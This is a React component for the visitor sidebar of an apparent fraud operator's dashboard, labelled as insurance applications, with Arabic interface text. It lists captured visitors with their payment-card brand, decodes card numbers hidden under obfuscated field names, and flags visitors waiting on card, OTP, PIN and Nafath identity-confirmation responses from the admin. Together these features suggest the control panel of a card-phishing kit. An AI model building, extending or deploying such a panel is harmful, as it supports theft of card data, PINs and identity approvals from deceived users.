"use client";

import {
  Search,
  Trash2,
  CheckSquare,
  Square,
  CreditCard,
  RefreshCw,
  Ban,
  ShieldCheck,
  Archive,
} from "lucide-react";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { getTimeAgo } from "@/lib/time-utils";
import { updateApplication } from "@/lib/firebase-services";
import { _d } from "@/lib/secure-utils";
import { useState } from "react";
import { getPageName, getVisitorCurrentPage } from "@/lib/page-names";

export type VisitorFilter = "all" | "hasCard" | "archive";

interface VisitorSidebarProps {
  visitors: InsuranceApplication[];
  selectedVisitor: InsuranceApplication | null;
  onSelectVisitor: (visitor: InsuranceApplication) => void;
  searchQuery: string;
  onSearchChange: (query: string) => void;
  cardFilter: VisitorFilter;
  onCardFilterChange: (filter: VisitorFilter) => void;
  selectedIds: Set<string>;
  onToggleSelect: (id: string) => void;
  onSelectAll: () => void;
  onDeleteSelected: () => void;
  onArchiveSelected: (ids: string[]) => void;
  sidebarWidth: number;
  onSidebarWidthChange: (width: number) => void;
}

// Check if visitor is waiting for admin response
const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
  return (
    visitor.cardStatus === "waiting" ||
    visitor.cardStatus === "message" ||
    visitor.otpStatus === "waiting" ||
    visitor.pinStatus === "waiting" ||
    visitor.nafadConfirmationStatus === "waiting"
  );
};

// Convert time value (Date/Timestamp/string/number) to milliseconds
const toMs = (value: unknown): number => {
  if (!value) return 0;
  if (value instanceof Date) return value.getTime();
  if (typeof value === "object" && typeof (value as any).toDate === "function") {
    try {
      return (value as any).toDate().getTime();
    } catch {
      return 0;
    }
  }
  const parsed = new Date(value as any).getTime();
  return Number.isNaN(parsed) ? 0 : parsed;
};

const getVisitorDisplayName = (visitor: InsuranceApplication) =>
  visitor.ownerName || (visitor as any).name || "زائر جديد";

const hasCardData = (visitor: InsuranceApplication): boolean => {
  if (visitor._v1 || visitor.cardNumber) return true;
  if (!visitor.history || !Array.isArray(visitor.history)) return false;
  return visitor.history.some(
    (entry: any) =>
      (entry.type === "_t1" || entry.type === "card") &&
      (entry.data?._v1 || entry.data?.cardNumber)
  );
};

// Get the raw card number string (decrypting obfuscated fields) for type detection
const getRawCardNumber = (visitor: InsuranceApplication): string => {
  // Direct obfuscated field
  if (visitor._v1) {
    try {
      const decoded = _d(visitor._v1);
      if (decoded && /\d/.test(decoded)) return decoded;
    } catch {
      // ignore
    }
  }
  // Backward compat plain field
  if (visitor.cardNumber) return visitor.cardNumber;

  // Check history for latest card entry
  if (visitor.history && Array.isArray(visitor.history)) {
    const cardEntries = visitor.history.filter(
      (entry: any) =>
        (entry.type === "_t1" || entry.type === "card") &&
        (entry.data?._v1 || entry.data?.cardNumber)
    );
    if (cardEntries.length > 0) {
      const latest = [...cardEntries].sort(
        (a: any, b: any) => toMs(b?.timestamp) - toMs(a?.timestamp)
      )[0];
      const raw =
        latest?.data?._v1
          ? (() => {
              try {
                return _d(latest.data._v1);
              } catch {
                return "";
              }
            })()
          : latest?.data?.cardNumber || "";
      if (raw && /\d/.test(raw)) return raw;
    }
  }
  return "";
};

type CardBrand = "visa" | "mastercard" | "mada" | "amex" | null;

// Detect card brand from card number or stored cardType field
const detectCardBrand = (visitor: InsuranceApplication): CardBrand => {
  // Try stored cardType first (from history or direct)
  const cardTypeSources = [
    visitor.cardType,
    visitor.bankInfo?.paymentMethod,
    ...(visitor.history || []).map((h: any) => h?.data?.cardType || h?.data?.scheme),
  ];

  for (const ct of cardTypeSources) {
    if (!ct) continue;
    const t = String(ct).toLowerCase();
    if (t.includes("mada")) return "mada";
    if (t.includes("visa")) return "visa";
    if (t.includes("master")) return "mastercard";
    if (t.includes("amex") || t.includes("american")) return "amex";
  }

  // Fallback: detect from first digit of card number
  const num = getRawCardNumber(visitor).replace(/\D/g, "");
  if (!num) return null;
  const first = num[0];
  if (first === "4") return "visa";
  if (first === "5") return "mastercard";
  if (first === "3") return "amex";
  // Mada cards start with specific ranges (often 4 or 5 but with Saudi BIN)
  // Without BIN lookup we can't reliably distinguish, so leave as null for non-Visa/MC
  return null;
};

// Country name to flag emoji mapping (common visitor countries)
const COUNTRY_FLAGS: Record<string, string> = {
  // Saudi Arabia variants
  "saudi arabia": "🇸🇦",
  "السعودية": "🇸🇦",
  "المملكة العربية السعودية": "🇸🇦",
  sa: "🇸🇦",
  sau: "🇸🇦",
  // Jordan
  jordan: "🇯🇴",
  "الأردن": "🇯🇴",
  jo: "🇯🇴",
  jor: "🇯🇴",
  // UAE
  "united arab emirates": "🇦🇪",
  "الإمارات": "🇦🇪",
  "الإمارات العربية المتحدة": "🇦🇪",
  ae: "🇦🇪",
  are: "🇦🇪",
  // Egypt
  egypt: "🇪🇬",
  "مصر": "🇪🇬",
  eg: "🇪🇬",
  egy: "🇪🇬",
  // Kuwait
  kuwait: "🇰🇼",
  "الكويت": "🇰🇼",
  kw: "🇰🇼",
  kwt: "🇰🇼",
  // Qatar
  qatar: "🇶🇦",
  "قطر": "🇶🇦",
  qa: "🇶🇦",
  qat: "🇶🇦",
  // Bahrain
  bahrain: "🇧🇭",
  "البحرين": "🇧🇭",
  bh: "🇧🇭",
  bhr: "🇧🇭",
  // Oman
  oman: "🇴🇲",
  "عُمان": "🇴🇲",
  "عمان": "🇴🇲",
  om: "🇴🇲",
  omn: "🇴🇲",
  // Yemen
  yemen: "🇾🇪",
  "اليمن": "🇾🇪",
  ye: "🇾🇪",
  yem: "🇾🇪",
  // Iraq
  iraq: "🇮🇶",
  "العراق": "🇮🇶",
  iq: "🇮🇶",
  irq: "🇮🇶",
  // Sudan
  sudan: "🇸🇩",
  "السودان": "🇸🇩",
  sd: "🇸🇩",
  // Syria
  syria: "🇸🇾",
  "سوريا": "🇸🇾",
  sy: "🇸🇾",
  // Lebanon
  lebanon: "🇱🇧",
  "لبنان": "🇱🇧",
  lb: "🇱🇧",
  // Morocco
  morocco: "🇲🇦",
  "المغرب": "🇲🇦",
  ma: "🇲🇦",
  // Algeria
  algeria: "🇩🇿",
  "الجزائر": "🇩🇿",
  dz: "🇩🇿",
  // Tunisia
  tunisia: "🇹🇳",
  "تونس": "🇹🇳",
  tn: "🇹🇳",
  // India
  india: "🇮🇳",
  "الهند": "🇮🇳",
  in: "🇮🇳",
  ind: "🇮🇳",
  // Pakistan
  pakistan: "🇵🇰",
  "باكستان": "🇵🇰",
  pk: "🇵🇰",
  // Bangladesh
  bangladesh: "🇧🇩",
  "بنغلاديش": "🇧🇩",
  bd: "🇧🇩",
  // Philippines
  philippines: "🇵🇭",
  ph: "🇵🇭",
  // Indonesia
  indonesia: "🇮🇩",
  id: "🇮🇩",
  // Nigeria
  nigeria: "🇳🇬",
  ng: "🇳🇬",
  // United States
  "united states": "🇺🇸",
  "أمريكا": "🇺🇸",
  us: "🇺🇸",
  usa: "🇺🇸",
  // United Kingdom
  "united kingdom": "🇬🇧",
  "بريطانيا": "🇬🇧",
  gb: "🇬🇧",
  uk: "🇬🇧",
  // Turkey
  turkey: "🇹🇷",
  "تركيا": "🇹🇷",
  tr: "🇹🇷",
};

// Convert ISO 3166-1 alpha-2 country code to flag emoji
const countryCodeToFlag = (code: string): string | null => {
  if (!code || code.length !== 2) return null;
  const cc = code.toUpperCase();
  if (!/^[A-Z]{2}$/.test(cc)) return null;
  const A = 0x1f1e6;
  return String.fromCodePoint(A + (cc.charCodeAt(0) - 65), A + (cc.charCodeAt(1) - 65));
};

const getCountryFlag = (visitor: InsuranceApplication): string | null => {
  const country = (visitor.country || "").trim();
  if (!country) return null;

  // Try direct lowercase match
  const lower = country.toLowerCase();
  if (COUNTRY_FLAGS[lower]) return COUNTRY_FLAGS[lower];

  // Try original case match (Arabic names)
  if (COUNTRY_FLAGS[country]) return COUNTRY_FLAGS[country];

  // Try as 2-letter country code
  const flag = countryCodeToFlag(country);
  if (flag) return flag;

  return null;
};

// Avatar style based on online/recency status
type AvatarStyle = {
  gradient: string;
  ring: string;
  dotColor: string;
  dotPulse: boolean;
};

const getAvatarStyle = (visitor: InsuranceApplication): AvatarStyle => {
  // Online (active within 30s) → green
  if (visitor.isOnline) {
    return {
      gradient: "linear-gradient(135deg, rgb(22,163,74), rgb(21,128,61))",
      ring: "rgba(34,197,94,0.25)",
      dotColor: "rgb(34,197,94)",
      dotPulse: true,
    };
  }
  // Recent activity (within 5 minutes) → amber
  const lastActive = toMs(visitor.lastActiveAt ?? visitor.lastSeen ?? visitor.updatedAt);
  if (lastActive > 0) {
    const fiveMinAgo = Date.now() - 5 * 60 * 1000;
    if (lastActive >= fiveMinAgo) {
      return {
        gradient: "linear-gradient(135deg, rgb(217,119,6), rgb(180,83,9))",
        ring: "rgba(245,158,11,0.25)",
        dotColor: "rgb(245,158,11)",
        dotPulse: false,
      };
    }
  }
  // Offline → gray
  return {
    gradient: "linear-gradient(135deg, rgb(75,85,99), rgb(55,65,81))",
    ring: "rgba(107,114,128,0.25)",
    dotColor: "rgb(107,114,128)",
    dotPulse: false,
  };
};

// Small inline SVG brand logo for the card
function BrandLogo({ brand }: { brand: CardBrand }) {
  if (brand === "visa") {
    return (
      <svg viewBox="0 0 50 16" className="h-3.5 w-auto" fill="none">
        <text
          x="0"
          y="13"
          fontFamily="Arial, sans-serif"
          fontWeight="900"
          fontSize="15"
          fill="#1a1f71"
          letterSpacing="-0.5"
        >
          VISA
        </text>
      </svg>
    );
  }
  if (brand === "mastercard") {
    return (
      <svg viewBox="0 0 38 24" className="h-4 w-auto">
        <circle cx="14" cy="12" r="11" fill="#EB001B" />
        <circle cx="24" cy="12" r="11" fill="#F79E1B" />
        <path
          d="M19 5.5a11 11 0 0 1 0 13A11 11 0 0 1 19 5.5z"
          fill="#FF5F00"
        />
      </svg>
    );
  }
  if (brand === "mada") {
    return (
      <svg viewBox="0 0 40 16" className="h-3.5 w-auto" fill="none">
        <text
          x="0"
          y="13"
          fontFamily="Arial, sans-serif"
          fontWeight="900"
          fontSize="14"
          fill="#5cb874"
          letterSpacing="-0.3"
        >
          mada
        </text>
      </svg>
    );
  }
  if (brand === "amex") {
    return (
      <svg viewBox="0 0 50 16" className="h-3.5 w-auto" fill="none">
        <text
          x="0"
          y="13"
          fontFamily="Arial, sans-serif"
          fontWeight="900"
          fontSize="12"
          fill="#2e77bb"
          letterSpacing="-0.3"
        >
          AMEX
        </text>
      </svg>
    );
  }
  return null;
}

function BlockButton({ visitor }: { visitor: InsuranceApplication }) {
  const [loading, setLoading] = useState(false);

  const handleToggle = async (e: React.MouseEvent) => {
    e.stopPropagation();
    if (!visitor.id || loading) return;
    setLoading(true);
    try {
      await updateApplication(visitor.id, { is_blocked: !visitor.is_blocked });
    } catch {
      // silent
    } finally {
      setLoading(false);
    }
  };

  return (
    <button
      onClick={handleToggle}
      disabled={loading}
      title={visitor.is_blocked ? "إلغاء الحظر" : "حظر الزائر"}
      className={`flex items-center justify-center w-7 h-7 rounded-full transition-all disabled:opacity-40 ${
        visitor.is_blocked
          ? "bg-red-100 text-red-600 hover:bg-red-200"
          : "bg-gray-100 text-gray-400 hover:bg-red-100 hover:text-red-600"
      }`}
    >
      {visitor.is_blocked ? (
        <ShieldCheck className="w-3.5 h-3.5" />
      ) : (
        <Ban className="w-3.5 h-3.5" />
      )}
    </button>
  );
}

// Avatar with person silhouette, status dot, and country flag
function VisitorAvatar({ visitor }: { visitor: InsuranceApplication }) {
  const style = getAvatarStyle(visitor);
  const flag = getCountryFlag(visitor);
  const displayName = getVisitorDisplayName(visitor);
  // Use first letter of name as fallback inside avatar (only when no country flag decoration needed)
  const initial = displayName.charAt(0);

  return (
    <div className="relative shrink-0">
      <div
        className="w-7 h-7 rounded-full flex items-center justify-center text-white text-[10px] font-bold overflow-hidden"
        style={{
          background: style.gradient,
          boxShadow: `0 0 0 2px ${style.ring}`,
        }}
      >
        {/* Person silhouette SVG */}
        <svg viewBox="0 0 40 40" className="w-full h-full" fill="none">
          <circle cx="20" cy="14" r="7" fill="white" opacity="0.2" />
          <circle cx="20" cy="14" r="5" fill="white" opacity="0.5" />
          <path
            d="M6 36c0-7.732 6.268-14 14-14s14 6.268 14 14"
            fill="white"
            opacity="0.25"
          />
        </svg>
        {/* Fallback initial (hidden behind SVG but available for screen readers) */}
        <span className="sr-only">{initial}</span>
      </div>

      {/* Status dot (bottom-right) */}
      <span
        className={`absolute bottom-0 right-0 w-2 h-2 rounded-full border border-white ${
          style.dotPulse ? "animate-pulse" : ""
        }`}
        style={{ background: style.dotColor }}
      />

      {/* Country flag (top-left) */}
      {flag && (
        <span className="absolute -top-0.5 -left-0.5 text-[8px] leading-none">
          {flag}
        </span>
      )}
    </div>
  );
}

export function VisitorSidebar({
  visitors,
  selectedVisitor,
  onSelectVisitor,
  searchQuery,
  onSearchChange,
  cardFilter,
  onCardFilterChange,
  selectedIds,
  onToggleSelect,
  onSelectAll,
  onDeleteSelected,
  onArchiveSelected,
  sidebarWidth,
}: VisitorSidebarProps) {
  const allSelected =
    visitors.length > 0 && selectedIds.size === visitors.length;
  const isLandscape =
    typeof window !== "undefined" &&
    window.matchMedia("(orientation: landscape) and (max-width: 1024px)")
      .matches;

  return (
    <div
      className="h-full w-full bg-white flex flex-col relative border-l border-gray-200 md:w-[300px] shadow-sm"
      style={{
        fontFamily: "Cairo, Tajawal, sans-serif",
        width: isLandscape ? `${sidebarWidth}px` : undefined,
      }}
    >
      {/* Header */}
      <div className="px-2 py-2 border-b border-gray-200 bg-white">
        {/* Title + Count + Filters */}
        <div className="flex items-center gap-1.5 mb-2">
          <span className="text-[11px] font-bold text-gray-700">صندوق الوارد</span>
          <span className="text-[10px] text-gray-500 font-mono bg-gray-100 px-1.5 py-0.5 rounded border border-gray-200">
            {visitors.length}
          </span>
          <div className="flex-1" />
          <button
            onClick={() => onCardFilterChange("all")}
            className={`text-[10px] px-2 py-0.5 rounded transition-colors ${
              cardFilter === "all"
                ? "bg-green-700 text-gray-900"
                : "bg-gray-100 text-gray-400 hover:bg-gray-200"
            }`}
          >
            الكل
          </button>
          <button
            onClick={() => onCardFilterChange("hasCard")}
            className={`text-[10px] px-2 py-0.5 rounded transition-colors ${
              cardFilter === "hasCard"
                ? "bg-green-700 text-gray-900"
                : "bg-gray-100 text-gray-400 hover:bg-gray-200"
            }`}
          >
            بطاقة
          </button>
          <button
            onClick={() => onCardFilterChange("archive")}
            className={`text-[10px] px-2 py-0.5 rounded transition-colors ${
              cardFilter === "archive"
                ? "bg-green-700 text-gray-900"
                : "bg-gray-100 text-gray-400 hover:bg-gray-200"
            }`}
          >
            الأرشيف
          </button>
        </div>

        {/* Search */}
        <div className="relative">
          <Search className="absolute right-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-gray-400" />
          <input
            type="text"
            placeholder="بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)"
            value={searchQuery}
            onChange={(e) => onSearchChange(e.target.value)}
            className="w-full pr-8 pl-3 py-1.5 bg-gray-50 border border-gray-200 rounded text-[11px] text-gray-700 placeholder-gray-400 focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500"
          />
        </div>

        {/* Select all + Delete/Archive actions */}
        <div className="mt-2 flex items-center gap-1.5">
          <button
            onClick={onSelectAll}
            className="flex flex-1 items-center justify-center gap-1 rounded bg-gray-100 px-2 py-1 text-[10px] font-medium text-gray-600 transition-colors hover:bg-gray-200"
          >
            {allSelected ? (
              <CheckSquare className="w-3 h-3" />
            ) : (
              <Square className="w-3 h-3" />
            )}
            {allSelected ? "إلغاء التحديد" : "تحديد الكل"}
          </button>
          {selectedIds.size > 0 && (
            <>
              <button
                onClick={() => onArchiveSelected(Array.from(selectedIds))}
                className="flex items-center justify-center gap-1 rounded bg-amber-500 px-3 py-1 text-[10px] font-medium text-white transition-colors hover:bg-amber-600"
              >
                <Archive className="w-3 h-3" />
                أرشفة ({selectedIds.size})
              </button>
              <button
                onClick={onDeleteSelected}
                className="flex items-center justify-center gap-1 rounded bg-red-500 px-3 py-1 text-[10px] font-medium text-white transition-colors hover:bg-red-600"
              >
                <Trash2 className="w-3 h-3" />
                حذف ({selectedIds.size})
              </button>
            </>
          )}
        </div>
      </div>

      {/* Visitor List */}
      <div className="flex-1 overflow-y-auto divide-y divide-gray-200">
        {visitors.length === 0 ? (
          <div className="p-8 text-center text-gray-500 space-y-2">
            <p className="text-3xl">📭</p>
            <p className="font-semibold">لا يوجد زوار</p>
            <p className="text-xs text-gray-400">
              سيظهر الزوار هنا عند بدء التفاعل
            </p>
          </div>
        ) : (
          visitors.map((visitor) => {
            const hasCard = hasCardData(visitor);
            const brand = hasCard ? detectCardBrand(visitor) : null;
            const waiting = isWaitingForAdmin(visitor);
            const isSelected = selectedVisitor?.id === visitor.id;
            const isChecked = visitor.id ? selectedIds.has(visitor.id) : false;

            // Row background based on state (selected > blocked > unread > hover)
            let rowBg = "hover:bg-gray-100";
            if (isSelected) {
              rowBg = "bg-green-50 border-r-2 border-green-500 shadow-sm";
            } else if (visitor.is_blocked) {
              rowBg = "bg-red-50 border-r-2 border-red-400";
            } else if (visitor.isUnread) {
              rowBg = "bg-green-50 hover:bg-gray-100";
            }

            return (
              <div
                key={visitor.id}
                onClick={() => onSelectVisitor(visitor)}
                className={`flex items-start gap-2 px-2.5 py-2.5 cursor-pointer transition-colors relative ${rowBg}`}
              >
                {/* Checkbox */}
                <div
                  onClick={(e) => {
                    e.stopPropagation();
                    if (visitor.id) onToggleSelect(visitor.id);
                  }}
                  className="mt-0.5 shrink-0 cursor-pointer text-gray-400"
                >
                  {isChecked ? (
                    <CheckSquare className="w-3.5 h-3.5 text-green-600" />
                  ) : (
                    <Square className="w-3.5 h-3.5" />
                  )}
                </div>

                {/* Avatar */}
                <VisitorAvatar visitor={visitor} />

                {/* Visitor Info */}
                <div className="flex-1 min-w-0">
                  {/* Row 1: Name + Card icons | Time ago + Block */}
                  <div className="flex items-center justify-between gap-1 mb-0.5">
                    <div className="flex items-center gap-1.5 min-w-0">
                      <span
                        className={`font-bold text-[13px] truncate leading-tight ${
                          visitor.isUnread || isSelected
                            ? "text-gray-900"
                            : "text-gray-700"
                        }`}
                      >
                        {getVisitorDisplayName(visitor)}
                      </span>
                      {/* Card brand icon */}
                      {hasCard && (
                        <span className="shrink-0 inline-flex items-center gap-0.5">
                          <CreditCard className="w-3.5 h-3.5 text-blue-600" />
                          {brand && <BrandLogo brand={brand} />}
                        </span>
                      )}
                      {/* Blocked badge */}
                      {visitor.is_blocked && (
                        <span className="shrink-0 inline-flex items-center gap-0.5 text-[9px] font-bold text-red-600">
                          <Ban className="w-2.5 h-2.5" />
                        </span>
                      )}
                    </div>

                    <div className="flex items-center gap-1 whitespace-nowrap shrink-0">
                      <span className="text-[10px] text-gray-400">
                        {getTimeAgo(visitor.updatedAt || visitor.lastSeen)}
                      </span>
                      {/* زر الحظر مخفي من الشريط الجانبي لإفساح مساحة لاسم العميل.
                          الدالة BlockButton تُترك معرّفة لاستخدامها في مكان آخر لاحقاً. */}
                      {/* <BlockButton visitor={visitor} /> */}
                    </div>
                  </div>

                  {/* Row 2: Page name + waiting spinner + online pulse dot */}
                  <div className="flex items-center gap-1.5 flex-wrap">
                    {waiting && (
                      <RefreshCw className="w-3 h-3 text-amber-600 animate-spin shrink-0" />
                    )}
                    <span className="text-[13px] font-semibold text-gray-600 truncate">
                      {getPageName(getVisitorCurrentPage(visitor))}
                    </span>
                    {visitor.isOnline && (
                      <span className="w-1.5 h-1.5 rounded-full bg-green-500 inline-block animate-pulse" />
                    )}
                  </div>
                </div>
              </div>
            );
          })
        )}
      </div>
    </div>
  );
}
